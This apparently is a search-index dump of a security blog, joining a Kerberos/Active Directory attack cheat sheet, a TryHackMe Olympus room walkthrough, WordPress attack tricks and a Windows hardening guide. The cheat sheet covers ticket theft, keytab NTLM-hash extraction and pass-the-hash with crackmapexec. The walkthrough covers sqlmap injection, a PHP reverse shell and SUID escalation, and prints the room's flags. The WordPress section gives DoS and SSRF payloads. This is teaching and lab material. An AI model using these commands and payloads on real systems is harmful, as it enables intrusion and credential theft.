used for authentication with env | grep KRB5CCNAME. The format is portable and the ticket can be reused by setting the environment variable with export KRB5CCNAME=/tmp/ticket.ccache. Kerberos ticket name format is krb5cc_%{uid} where uid is the user UID.\n$ ls /tmp/ | grep krb5cc krb5cc_1000 krb5cc_1569901113 krb5cc_1569901115 $ export KRB5CCNAME=/tmp/krb5cc_1569901115 CCACHE ticket reuse from keyring # Tool to extract Kerberos tickets from Linux kernel keys : https://github.com/TarlogicSecurity/tickey\n# Configuration and build git clone https://github.com/TarlogicSecurity/tickey cd tickey/tickey make CONF=Release [root@Lab-LSV01 /]# /tmp/tickey -i [*] krb5 ccache_name = KEYRING:session:sess_%{uid} [+] root detected, so... DUMP ALL THE TICKETS!! [*] Trying to inject in tarlogic[1000] session... [+] Successful injection at process 25723 of tarlogic[1000],look for tickets in /tmp/__krb_1000.ccache [*] Trying to inject in velociraptor[1120601115] session... [+] Successful injection at process 25794 of velociraptor[1120601115],look for tickets in /tmp/__krb_1120601115.ccache [*] Trying to inject in trex[1120601113] session... [+] Successful injection at process 25820 of trex[1120601113],look for tickets in /tmp/__krb_1120601113.ccache [X] [uid:0] Error retrieving tickets CCACHE ticket reuse from SSSD KCM # SSSD maintains a copy of the database at the path /var/lib/sss/secrets/secrets.ldb. The corresponding key is stored as a hidden file at the path /var/lib/sss/secrets/.secrets.mkey. By default, the key is only readable if you have root permissions.\nInvoking SSSDKCMExtractor with the \u0026ndash;database and \u0026ndash;key parameters will parse the database and decrypt the secrets.\ngit clone https://github.com/fireeye/SSSDKCMExtractor python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey The credential cache Kerberos blob can be converted into a usable Kerberos CCache file that can be passed to Mimikatz/Rubeus.\nCCACHE ticket reuse from keytab # git clone https://github.com/its-a-feature/KeytabParser python KeytabParser.py /etc/krb5.keytab klist -k /etc/krb5.keytab Extract accounts from /etc/krb5.keytab # The service keys used by services that run as root are usually stored in the keytab file /etc/krb5.keytab. This service key is the equivalent of the service\u0026rsquo;s password, and must be kept secure.\nUse klist to read the keytab file and parse its content. The key that you see when the key type is 23 is the actual NT Hash of the user.\n$ klist.exe -t -K -e -k FILE:C:\\Users\\User\\downloads\\krb5.keytab [...] [26] Service principal: host/COMPUTER@DOMAIN KVNO: 25 Key type: 23 Key: 31d6cfe0d16ae931b73c59d7e0c089c0 Time stamp: Oct 07, 2019 09:12:02 [...] On Linux you can use KeyTabExtract: we want RC4 HMAC hash to reuse the NLTM hash.\n$ python3 keytabextract.py krb5.keytab [!] No RC4-HMAC located. Unable to extract NTLM hashes. # No luck [+] Keytab File successfully imported. REALM : DOMAIN SERVICE PRINCIPAL : host/computer.domain NTLM HASH : 31d6cfe0d16ae931b73c59d7e0c089c0 # Lucky On macOS you can use bifrost.\n./bifrost -action dump -source keytab -path test Connect to the machine using the account and the hash with CME.\n$ crackmapexec 10.XXX.XXX.XXX -u \u0026#39;COMPUTER$\u0026#39; -H \u0026#34;31d6cfe0d16ae931b73c59d7e0c089c0\u0026#34; -d \u0026#34;DOMAIN\u0026#34; CME 10.XXX.XXX.XXX:445 HOSTNAME-01 [+] DOMAIN\\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0 References # Explain like I’m 5: Kerberos - Apr 2, 2013 - @roguelynn Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter Abusing Exchange: One API call away from Domain Admin - Dirk-jan Mollema Abusing Kerberos: Kerberoasting - Haboob Team Abusing S4U2Self: Another Sneaky Active Directory Persistence - Alsid Attacks Against Windows PXE Boot Images - February 13th, 2018 - Thomas Elling BUILDING AND ATTACKING AN ACTIVE DIRECTORY LAB WITH POWERSHELL - @myexploit2600 \u0026amp; @5ub34x Becoming Darth Sidious: Creating a Windows Domain (Active Directory) and hacking it - @chryzsh BlueHat IL - Benjamin Delpy COMPROMISSION DES POSTES DE TRAVAIL GRÂCE À LAPS ET PXE MISC n° 103 - mai 2019 - Rémi Escourrou, Cyprien Oger Chump2Trump - AD Privesc talk at WAHCKon 2017 - @l0ss DiskShadow The return of VSS Evasion Persistence and AD DB extraction Domain Penetration Testing: Using BloodHound, Crackmapexec, \u0026amp; Mimikatz to get Domain Admin Dumping Domain Password Hashes - Pentestlab Exploiting MS14-068 with PyKEK and Kali - 14 DEC 2014 - ZACH GRACE @ztgrace Exploiting PrivExchange - April 11, 2019 - @chryzsh Exploiting Unconstrained Delegation - Riccardo Ancarani - 28 APRIL 2019 Finding Passwords in SYSVOL \u0026amp; Exploiting Group Policy Preferences How Attackers Use Kerberos Silver Tickets to Exploit Systems - Sean Metcalf Fun with LDAP, Kerberos (and MSRPC) in AD Environments Getting the goods with CrackMapExec: Part 1, by byt3bl33d3r Getting the goods with CrackMapExec: Part 2, by byt3bl33d3r Golden ticket - Pentestlab How To Pass the Ticket Through SSH Tunnels - bluescreenofjeff Hunting in Active Directory: Unconstrained Delegation \u0026amp; Forests Trusts - Roberto Rodriguez - Nov 28, 2018 Invoke-Kerberoast - Powersploit Read the docs Kerberoasting - Part 1 - Mubix “Rob” Fuller Passing the hash with native RDP client (mstsc.exe) Pen Testing Active Directory Environments - Part I: Introduction to crackmapexec (and PowerView) Pen Testing Active Directory Environments - Part II: Getting Stuff Done With PowerView Pen Testing Active Directory Environments - Part III: Chasing Power Users Pen Testing Active Directory Environments - Part IV: Graph Fun Pen Testing Active Directory Environments - Part V: Admins and Graphs Pen Testing Active Directory Environments - Part VI: The Final Case Penetration Testing Active Directory, Part I - March 5, 2019 - Hausec Penetration Testing Active Directory, Part II - March 12, 2019 - Hausec Post-OSCP Series Part 2 - Kerberoasting - 16 APRIL 2019 - Jon Hickman Quick Guide to Installing Bloodhound in Kali-Rolling - James Smith Red Teaming Made Easy with Exchange Privilege Escalation and PowerPriv - Thursday, January 31, 2019 - Dave Roasting AS-REPs - January 17, 2017 - harmj0y Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam Toscher Using bloodhound to map the user network - Hausec WHAT’S SPECIAL ABOUT THE BUILTIN ADMINISTRATOR ACCOUNT? - 21/05/2012 - MORGAN SIMONSEN WONKACHALL AKERVA NDH2018 – WRITE UP PART 1 WONKACHALL AKERVA NDH2018 – WRITE UP PART 2 WONKACHALL AKERVA NDH2018 – WRITE UP PART 3 WONKACHALL AKERVA NDH2018 – WRITE UP PART 4 WONKACHALL AKERVA NDH2018 – WRITE UP PART 5 Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory - 28 January 2019 - Elad Shami [PrivExchange] From user to domain admin in less than 60sec ! - davy Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy - March 16, 2017 - harmj0y Kerberos (II): How to attack Kerberos? - June 4, 2019 - ELOY PÉREZ Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory - Sean Metcalf All you need to know about Keytab files - Pierre Audonnet [MSFT] - January 3, 2018 Taming the Beast Assess Kerberos-Protected Networks - Emmanuel Bouillon Playing with Relayed Credentials - June 27, 2018 Exploiting CVE-2019-1040 - Combining relay vulnerabilities for RCE and Domain Admin - Dirk-jan Mollema Drop the MIC - CVE-2019-1040 - Marina Simakov - Jun 11, 2019 How to build a SQL Server Virtual Lab with AutomatedLab in Hyper-V - October 30, 2017 - Craig Porteous SMB Share – SCF File Attacks - December 13, 2017 - @netbiosX Escalating privileges with ACLs in Active Directory - April 26, 2018 - Rindert Kramer and Dirk-jan Mollema A Red Teamer’s Guide to GPOs and OUs - APRIL 2, 2018 - @_wald0 Carlos Garcia - Rooted2019 - Pentesting Active Directory Forests public.pdf Kerberosity Killed the Domain: An Offensive Kerberos Overview - Ryan Hausknecht - Mar 10 Active-Directory-Exploitation-Cheat-Sheet - @buftas GPO Abuse - Part 1 - RastaMouse - 6 January 2019 GPO Abuse - Part 2 - RastaMouse - 13 January 2019 Abusing GPO Permissions - harmj0y - March 17, 2016 How To Attack Kerberos 101 - m0chan - July 31, 2019 ACE to RCE - @JustinPerdok - July 24, 2020 Zerologon:Unauthenticated domain controller compromise by subverting Netlogon cryptography (CVE-2020-1472) - Tom Tervoort, September 2020 Access Control Entries (ACEs) - The Hacker Recipes - @_nwodtuhs CVE-2020-17049: Kerberos Bronze Bit Attack – Practical Exploitation - Jake Karnes - December 8th, 2020 CVE-2020-17049: Kerberos Bronze Bit Attack – Theory - Jake Karnes - December 8th, 2020 Kerberos Bronze Bit Attack (CVE-2020-17049) Scenarios to Potentially Compromise Active Directory GPO Abuse: \u0026ldquo;You can\u0026rsquo;t see me\u0026rdquo; - Huy Kha - July 19, 2019 Lateral movement via dcom: round 2 - enigma0x3 - January 23, 2017 New lateral movement techniques abuse DCOM technology - Philip Tsukerman - Jan 25, 2018 Kerberos Tickets on Linux Red Teams - April 01, 2020 | by Trevor Haskell AD CS relay attack - practical guide - 23 Jun 2021 - @exandroiddev Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover - Elad Shamir - Jun 17 Playing with PrintNightmare - 0xdf - Jul 8, 2021 Attacking Active Directory: 0 to 0.9 - Eloy Pérez González - 2021/05/29 Microsoft ADCS – Abusing PKI in Active Directory Environment - Jean MARSAULT - 14/06/2021 Certified Pre-Owned - Will Schroeder and Lee Christensen - June 17, 2021 NTLM relaying to AD CS - On certificates, printers and a little hippo - Dirk-jan Mollema Certified Pre-Owned Abusing Active Directory Certificate Services - @harmj0y @tifkin_ Certified Pre-Owned - Will Schroeder - Jun 17 2021 AD CS/PKI template exploit via PetitPotam and NTLMRelayx, from 0 to DomainAdmin in 4 steps by frank | Jul 23, 2021 NTLMv1_Downgrade.md - S3cur3Th1sSh1t - 09/07/2021 UnPAC the hash - The Hacker Recipes Lateral Movement – WebClient Shadow Credentials: Workstation Takeover Edition - Matthew Creel Certificate templates - The Hacker Recipes CA configuration - The Hacker Recipes Access controls - The Hacker Recipes Web endpoints - The Hacker Recipes sAMAccountName spoofing - The Hacker Recipes CVE-2021-42287/CVE-2021-42278 Weaponisation - @exploitph ADCS: Playing with ESC4 - Matthew Creel The Kerberos Key List Attack: The return of the Read Only Domain Controllers - Leandro Cuozzo AD CS: weaponizing the ESC7 attack - Kurosh Dabbagh - 26 January, 2022 AD CS: from ManageCA to RCE - 11 February, 2022 - Pablo Martínez, Kurosh Dabbagh Introducing the Golden GMSA Attack - YUVAL GORDON - March 01, 2022 Introducing MalSCCM - Phil Keeble -May 4, 2022 Certifried: Active Directory Domain Privilege Escalation (CVE-2022–26923) - Oliver Lyak bloodyAD and CVE-2022-26923 - soka - 11 May 2022 DIVING INTO PRE-CREATED COMPUTER ACCOUNTS - May 10, 2022 - By Oddvar Moe How NOT to use the PAM trust - Leveraging Shadow Principals for Cross Forest Attacks - Thursday, April 18, 2019 - Nikhil SamratAshok Mittal Shadow Credentials - The Hacker Recipes Network Access Accounts are evil… - ROGER ZANDER - 13 SEP 2015 The Phantom Credentials of SCCM: Why the NAA Won’t Die - Duane Michael - Jun 28 "},{"id":4,"href":"/posts/tryhackme_walkthrough_olympus/","title":"TryHackMe - Olympus Walkthrough","section":"Blog","content":" Task 1 | Connection # https://tryhackme.com/room/olympusroom is a medium difficulty room on [https://tryhackme.com/](TryHackMe training platform) by Gavroche.\nIt\u0026rsquo;s primary focus is sql injection, in my opinion, with a slant on enumeration and systems comprehension.\nWe\u0026rsquo;re going to get started by adding olympus.thm to our /etc/hosts file to assist with enumeration.. this is recommended in the description and I\u0026rsquo;ve adopted it as a solid sign that we\u0026rsquo;ll need to do subdomain enumeration. But, we don\u0026rsquo;t \u0026ldquo;know that\u0026rdquo;, yet.\nTask 2 | Flag Submission # Let\u0026rsquo;s dive into the enumeration. We\u0026rsquo;ll kick off with quick nmap and some file and directory brute forcing.\nNmap scan report for olympus.thm (10.10.94.239) Host is up, received reset ttl 61 (0.097s latency). Scanned at 2022-11-25 12:15:42 EST for 18s Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 0a7814042cdf25fb4ea21434800b8539 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPNeXYxrC1xv8fhFNve9CXjWSQcCXnWZThU1putOar7KBcQmoCQUYOqvmS+CDauJMPqVE3rqS0+CpTJnZn2ZWXDaCzFLZ84hjBXq8BqoWOFB0Vv0PjRKfBKC54tpA67NgLfp1TmmlS6jp4i75lxkZ6pSTOPxGUrvYvJ0iN2cAHJkgA9SZDrvT11HEp5oLmS2lXtFSoK/Q9pKNIl7y+07gZLRUeIKIn1bFRc4qrXn+rpDQR2fP9OEYiHhdJmTJJL+KjDAqZmIj0SYtuzD4Ok2Nkg5DHlCzOizYNQAkkj6Ift7dkD6LPebRp9MkAoThDzLya7YaFIP66mCbxJRPcNfQ3bJkUy0qTsu9MiiNtyvd9m8vacyA803eKIERIRj5JK1BTUKNAzsZeAuao9Kq/etHskvTy0TKspeBLwdmmRFkqerDIrznWcRyG/UnsEGUARe2h6CwuCJH8QCPMSc93zMrsZNs1z3FIoMzWTf23MWDOeNA8dkYewrDywEuOvb3Vrvk= | 256 8d5601ca55dee17c6404cee6f1a5c7ac (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHFtzLQXLhGiDzPN7Al84lSfH3jFwGniFL5WQSaIjC+VGMU8mbvbGVuOij+xUAbYarbBuoUagljDmBR5WIRSDeo= | 256 1fc1be3f9ce78e243334a644af684c3c (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKhvoRyjZN/taS1uwwTaQ4uZrGhVUje0YWW4jg4rfdXw 80/tcp open http syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: ED726E098473BFA7523153F761D2232F |_http-title: Olympus | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) We can see on the homepage, which has some nice CSS that the \u0026ldquo;it-department\u0026rdquo; flat out tells us that the old version of the website is still available somewhere, so we kick of the enumeration scanning. We find some non-traditional versions of some folders we expect and some 403 folders, I used dirsearch just because I typically use ffuf and I felt like using something different. It actually enumerated all of the /phpmyadmin/ despite that they all returned 403.. some other folders we bumped into were /javascript/, /static/ and none of these were useful until I tried some other smaller wordlists big.txt from dirb exposed the directory /~webmaster/ which landed me on a CMS. First step complete. Time to start finding some vulnerabilities and exposing some flags.\nFlag 1 # Landing on the CMS, I start with a manual pentesting. Just some basic toying with user-supplied input immediately exposes and SQL injection vulnerability on the search function. As well, the typical ' OR '1'='1'; - --' seems to bypass login to some extent that would likely be worth investigating. But, lets start with the SQLi.. if we can get access the database, we\u0026rsquo;ll probably find some flags, as well if we can get a shell, we can find some flags. So, we\u0026rsquo;ll take go ahead and launch sqlmap (note too that the comments here expose the CMS as being Simple Content Management System, October 2016 .. So, you could definitely search for vulnerabilities affecting that platform. But, we\u0026rsquo;re not going to do that, as discussed, let\u0026rsquo;s go ahead and launch sqlmap\nsqlmap -u http://ip/~webmaster/ -a --crawl 3 --threads 10 --level 5 --risk 3 --forms\nThis should be sufficient, we\u0026rsquo;re going to go and just grab a PHP session cookie. As soon as it asks if you want to fuzz search.php say yes and it should quickly find several SQL injection vulnerabilities almost right away. Mine found a timing attack first, whisn\u0026rsquo;t my preference but I let it run wild anyway. Sure enough, it dumped the whole database pretty fast. The first thing to note here is the flag table.\nflag{Sm4rt!_k33P_d1gGIng}\nFlag 2 # Next I went trying to crack the dumped passwords and I was able to break the user prometheus using the john and rockyou.txt wordlist prometheus:summertime.\nSigning in as this user and hunting for more vulnerabilities, I did continue to find more but nothing else led me really any further. Feel free to explore that on your own, your results may differ.\nI did notice one thing, however.. other than prometheus, the users\u0026rsquo;s the e-mail address all showed the domain chat.olympus.thm - so, I added that to my /etc/hosts file and tried browsing to it, whala we\u0026rsquo;ve founda new vhost. I try the user prometheus credentials here and they still work.\nEven better, it\u0026rsquo;s a chat and there\u0026rsquo;s chat history. We can read that the other user uploaded a file and it\u0026rsquo;s name changed on him, so he had difficulty finding it. Well, it\u0026rsquo;s point us directly at the next vulnerability AND I dump everything when I run sqlmap, so I happened to already realize the chat data is in there, I rememebered seeing a filename resembling a hash listed with a user. I went an double checked, sure enough. So, I went and grabbed Pentest Monkey\u0026rsquo;s reverse PHP shell, and uploaded it.. I ran sqlmap again and dumped the Chat table again, sure enough there was my file with a new filename.. So, I opened up netcat to listen for the incoming connection and browsed to the file and boom, reverse shell. Unfortunately we still have a short ways to go to get the next flag. Searching for a flag as the www-data user was unsucessful for me. So, I set my sights on privilege escalation to either zeus or root, obviously a strong preference for root. One of the first things that stands out is searching for a setmode executables returns /usr/bin/cputils and it\u0026rsquo;s exactly what it looks like. It runs as user zeus and it lets you copy a file seeing zeus has a .ssh folder in it\u0026rsquo;s home directory we correctly assume there\u0026rsquo;s an SSH key sitting in there with a default name and copy /home/zeus/.ssh/id_rsa out and either use scp to download it or just co[y and paste it and set the right permissions on the new file chmod 600 id_rsa. From there, I try to ssh in as zeus to find the key is password protected so we run ssh2john and crack the key snowflake.. then we sshe in as zeus ssh -i id_rsa zeus@olympus.thm. Finally another flag.\nflag{Y0u_G0t_TH3_l1ghtN1nG_P0w3R}\nFlag 3 # There\u0026rsquo;s no more users to escalate too, so we assume there\u0026rsquo;s a hidden flag. I search environment variables and don\u0026rsquo;t find anything and start assume I\u0026rsquo;m going to have to break out of a container or VM as root. So, I go for root. But I do find all these random files in /var/www/html that I didn\u0026rsquo;t know were sitting there (recalling the reverse shell dropped us in / and not /var/www/html) it\u0026rsquo;s not available from the http service. So I check out these files and I noticed these two lines:\n$suid_bd = \u0026#34;/lib/defended/libc.so.99\u0026#34;; $shell = \u0026#34;uname -a; w; $suid_bd\u0026#34;; To me this looks exactly like a malicious library that\u0026rsquo;s going to pop a root shell, so I just run it manually uname -a; w; /lib/defended/libc.so.99 and sure it enough I get the coveted # .. cd /root and there\u0026rsquo;s your flag:\nflag{D4mN!Y0u_G0T_m3:)_}\nFlag 4 # First I jump back to / and kick off a very slow and long command grep -r flag and I go browsing looking for methods to break out of LXD. I don\u0026rsquo;t find anything too new, mostly old ways to exploit lxc to gain root and not really anything new about breaking out of a container. So, I go ahead and run find / -name flag and within seconds it finds the final flag hiding in /etc (preceding .):\nflag{Y0u_G0t_m3_g00d!}\n"},{"id":5,"href":"/docs/wordpress/","title":"Wordpress Security","section":"Docs","content":" WordPress Security # Wordpress Tools: # https://github.com/wpscanteam/wpscan - One of the better tools at it\u0026rsquo;s just. \u0026ndash; gem install wpscan \u0026ndash; docker pull wpscanteam/wpscan \u0026ndash; wpscan \u0026ndash;update # updates the database \u0026ndash; Users of pentesting distrobutions generally should install the version from their repository. https://github.com/nullfil3/xmlrpc-scan https://github.com/relarizky/wpxploit Wordpress Tricks: # load-scripts.php denial of service # load-scripts.php resource exhaustion Wordpress versions 4.9.3 and prior:\n/wp-admin/load-scripts.php?load=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter Check IP behind Cloudflare # https://blog.nem.ec/2020/01/22/discover-cloudflare-wordpress-ip/ Get the IP address of a target wordpress website by abusing the ping-back feature\nTesting xml-rpc on all Wordpress versions # https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/\npingback.xml (can be used for DoS and potential to zombie into a DDoS) # \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;iso-8859-1\u0026#34;?\u0026gt; \u0026lt;methodCall\u0026gt; \u0026lt;methodName\u0026gt;pingback.ping\u0026lt;/methodName\u0026gt; \u0026lt;params\u0026gt; \u0026lt;param\u0026gt; \u0026lt;value\u0026gt; \u0026lt;string\u0026gt;http://10.0.0.1/hello/world\u0026lt;/string\u0026gt; \u0026lt;/value\u0026gt; \u0026lt;/param\u0026gt; \u0026lt;param\u0026gt; \u0026lt;value\u0026gt; \u0026lt;string\u0026gt;https://10.0.0.1/hello/world/\u0026lt;/string\u0026gt; \u0026lt;/value\u0026gt; \u0026lt;/param\u0026gt; \u0026lt;/params\u0026gt; \u0026lt;/methodCall\u0026gt; WordPress xml-rpc.php SSRF (internal/local port scan) # Easy example would be to check a port that needs to be open or is generally open internally\n\u0026lt;methodCall\u0026gt; \u0026lt;methodName\u0026gt;pingback.ping\u0026lt;/methodName\u0026gt; \u0026lt;params\u0026gt;\u0026lt;param\u0026gt; \u0026lt;value\u0026gt;\u0026lt;string\u0026gt;http://\u0026lt;TARGET-TO-SCAN\u0026gt;:\u0026lt;PORT-TO-CHECK\u0026gt;\u0026lt;/string\u0026gt;\u0026lt;/value\u0026gt; \u0026lt;/param\u0026gt;\u0026lt;param\u0026gt;\u0026lt;value\u0026gt;\u0026lt;string\u0026gt;http://\u0026lt;SOME VALID BLOG FROM THE SITE \u0026gt;\u0026lt;/string\u0026gt; \u0026lt;/value\u0026gt;\u0026lt;/param\u0026gt;\u0026lt;/params\u0026gt; \u0026lt;/methodCall\u0026gt; Lsist available methods through xml-rpc # \u0026lt;methodCall\u0026gt; \u0026lt;methodName\u0026gt;system.listMethods\u0026lt;/methodName\u0026gt; \u0026lt;params\u0026gt;\u0026lt;/params\u0026gt; \u0026lt;/methodCall\u0026gt; curl -X POST -d @pingback.xml https://exmaple.com/xmlrpc.php\nCheck for presence of xmlrpc # curl -d '\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;iso-8859-1\u0026quot;?\u0026gt;\u0026lt;methodCall\u0026gt;\u0026lt;methodName\u0026gt;demo.sayHello\u0026lt;/methodName\u0026gt;\u0026lt;params/\u0026gt;\u0026lt;/methodCall\u0026gt;' -k https://example.com/xmlrpc.php\nxml-rpc.php tool # https://github.com/nullfil3/xmlrpc-scan Enumerate users # for i in {1..50}; do curl -s -L -i https://example.com/wordpress?author=$i | grep -E -o \u0026#34;Location:.*\u0026#34; | awk -F/ \u0026#39;{print $NF}\u0026#39;; done https://site.com/wp-json/wp/v2/users/\nCommon Misconfigurations: # Often admins will forget to disable directory listing even for sensitive directories (plugins/themes/etc.. worth checking, I always try /wp-content/uploads/ hoping for directory listing) wp-cron.php denial of service: If they\u0026rsquo;re running any kind of older WP then wp-cron runs every time a web page is loaded. For sites make use of several plugins or poorly coded plugins or even just things that take a while to complete (rebuilding cache?), a flood of requests can cause the wp-cron.php method to take the site down.. "},{"id":6,"href":"/docs/windows_hardening/","title":"Windows - Hardening","section":"Docs","content":" Windows - Hardening # Essential Concepts to Understand # Windows Services # Windows Services create and manage critical functions such as network connectivity, storage, memory, sound, user credentials, and data backup and runs automatically in the background. These services are managed by the Service Control Manager panel and divided into three categories, i.e. Local, Network \u0026amp; System. Many applications like browsers and anti-virus software can also run their services for a seamless user experience.\nType services.msc in the Run window to access Windows services.\nWindows Registry # The Windows registry is a unified container database that stores configurational settings, essential keys and shared preferences for Windows and third-party applications. Usually, on the installation of most applications, it uses a registry editor for storing various states of the application. For example, suppose an application (malicious or normal) wants to execute itself during the computer boot-up process; In that case, it will store its entry in the Run \u0026amp; Run Once key.\nUsually, a malicious program makes undesired changes in the registry editor and tries to abuse its program or service as part of system routine activities. It is always recommended to protect the registry editor by limiting its access to unauthorised users.\nType regedit in the Run dialogue or taskbar search to access the registry editor.\nWindows Event Viewer # Event Viewer is an app that shows log details about all events occurring on your computer, including driver updates, hardware failures, changes in the operating system, invalid authentication attempts and application crash logs. Event Viewer receives notifications from different services and applications running on the computer and stores them in a centralised database. Hackers and malicious actors access Event Viewer to increase their attack surface and enhance the target system\u0026rsquo;s profiling. Event categories are as below:\nApplication: Records events of system components. System: Records events of already installed programs. Security: Logs events related to security and authentication etc. We can access Event Viewer by typing eventvwr in the Run window. The default location for storing events is C:\\WINDOWS\\system32\\config\\folder\nWindows Telemetry # Telemetry is a data collection system used by Microsoft to enhance the user experience by preemptively identifying security and functional issues in software. An application seamlessly shares data (crash logs, application-specific) with Microsoft to improve the user experience for future releases.\nTelemetry functionality is achieved by Universal Telemetry Client (UTC) services available in Windows and runs through diagtrack.dll. Contents acquired through telemetry service are stored encrypted in a local folder %ProgramData%\\Microsoft\\Diagnosis and sent to Microsoft after 15 minutes or so.\nWe can access The DiagTrack through the Services console in Windows 10.\nIdentity and Access Management # Standard and Admin Accounts # Identity and access management involves employing best practices to ensure that only authenticated and authorised users can access the system. There are two types of accounts in Windows, i.e. Admin and Standard Account. Per best practice, the Admin account should only be used to carry out tasks like software installation and accessing the registry editor, service panel, etc. Routine functions like access to regular applications, including Microsoft Office, browser, etc., can be allowed to standard accounts. Go to Control Panel \u0026gt; User Accounts to create standard or administrator accounts.\nIn either case, a user can authenticate themselves on the system through a password; however, Windows 10 has introduced a new feature called Windows Hello, which allows authenticating someone based on “something you have, something you know or something you are”. To access accounts and select the sign-in option, go to Settings \u0026gt; Accounts \u0026gt; Sign-in Options.\nUser Account Control # User Account Control (UAC) is a feature that enforces enhanced access control and ensures that all services and applications execute in non-administrator accounts. It helps mitigate malware\u0026rsquo;s impact and minimises privilege escalation by bypassing UAC. Actions requiring elevated privileges will automatically prompt for administrative user account credentials if the logged-in user does not already possess these. For example, installing device drivers or allowing inbound connections through Windows Firewall requires more permissions than already available privileges for a standard user.\nAs a principle, always follow the Principle of Least Privilege, which states that (Per CISA) “a subject should be given only those privileges needed for it to complete its task. If a subject does not need an access right, the subject should not have that right”. To access UAC, go to Control Panel -\u0026gt; User Accounts and click on Change User Account Control Setting.\nLocal Policies and Group Policy Editor # Group Policy Editor is a built-in interactive tool by Microsoft that allows to configure and implement local and group policies. We mainly use this feature when part of a network; however, we can also use it for a workstation to limit the execution of vulnerable extensions, set password policies, and other administrative settings. Note: The feature is not available in Windows Home but only in the Pro and Enterprise versions.\nPassword Policies # One primary use of a local policy editor is to ensure complex and strong passwords for user accounts. For example, we can design password policies to maximise our security:\nPasswords must contain both uppercase and lowercase characters. Check passwords against leaked or already hacked databases or a dictionary of compromised passwords. In case of 6 failed login attempts within 15 minutes, the account will remain locked for at least 1 hour. We can access Password policies through the Local group policy editor. Security settings \u0026gt; Account Policies \u0026gt; Password policy\nSetting a Lockout Policy # To protect your system password from being guessed by an attacker, we can set out a lockout policy so the account will automatically lock after certain invalid attempts. To set a lockout policy, go to Local Security Policy \u0026gt; Windows Settings \u0026gt; Account Policies \u0026gt; Account Lockout Policy and configure values to lock out hackers after three invalid attempts.\nNetwork Management # Windows Defender Firewall # Windows Defender Firewall is a built-in application that protects computers from malicious attacks and blocks unauthorised traffic through inbound and outbound rules or filters. As an analogy, this is equivalent to “who is coming in and going out of your home”. Malicious actors abuse Windows Firewall by bypassing existing rules. For example, if we have configured the firewall to allow incoming connections, hackers will try to manipulate the functionality by creating a remote connection to the victim\u0026rsquo;s computer. You can see more details about Windows Firewall Configuration here. We can access Windows Defender Firewall by accessing WF.msc in the Run dialogue.\nAs mentioned in the Windows Fundamentals room, it has three main profiles Domain, Public and Private. The Private profile must be activated with \u0026ldquo;Blocked Incoming Connections\u0026rdquo; while using the computer at home. View detailed settings for each profile by clicking on Windows Defender Firewall Properties. Whenever 